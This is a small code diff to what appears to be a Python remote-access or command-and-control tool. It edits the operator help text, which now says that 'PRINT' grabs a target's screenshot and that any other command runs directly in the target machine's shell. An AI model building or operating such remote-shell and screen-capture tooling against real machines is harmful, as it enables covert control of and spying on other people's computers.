@@ -18,7 +18,8 @@ def receive_prt_sc(client, n):
 
 
 def handle_print_screen(client):
-    print("[+] 'PRINT' to take a target's screenshot\n")
+    print("[+] 'PRINT' to take a target's screenshot")
+    print("[+] Any other commands will be executed directly in the target machine's shell\n")
     n = 0
     while True:
         while True:
